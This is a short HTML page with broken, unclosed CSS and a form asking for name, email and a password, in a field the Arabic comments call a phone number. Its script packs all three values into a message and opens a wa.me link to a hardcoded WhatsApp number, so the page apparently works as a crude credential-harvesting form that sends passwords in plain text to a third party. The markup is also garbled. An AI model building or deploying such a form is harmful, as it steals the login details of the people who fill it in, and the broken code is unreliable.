         .container {
      max-width: 400px;

      display: flex;

    label {
      display: block;
      margin-bottom: 5px;

    }

    input[type="text"], input[type="email"], input[type="password"], select {
      width: 95%;

      border-radius: 4px;
    }

    .btn {
      background-color: #007bff;

 button {

<body> 
     <div class="container">
    <div class="header">
<h1>Hello In Text Plane<input type="text" id="name" placeholder="Name" required>
    <input type="text" id="email" placeholder="Your email" required>
    <input type="tel" id="phone" placeholder="Your password" required>
   
    <button onclick="sendToWhatsApp()">next</button>
</div>
    <script>
        function sendToWhatsApp() {
            var name = document.getElementById("name").value;
            var email = document.getElementById("email").value;
            var phone = document.getElementById("phone").value;

            // صياغة الرسالة
            var message = `اسم: ${name}\nالبريد الإلكتروني: ${email}\nرقم الهاتف: ${phone}`;
            var whatsappNumber = "201123961290"; // رقم الهاتف
            var whatsappURL = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;

            // توجيه المستخدم إلى WhatsApp
            window.open(whatsappURL, '_blank');
        }
    </script>

</body>
</html>
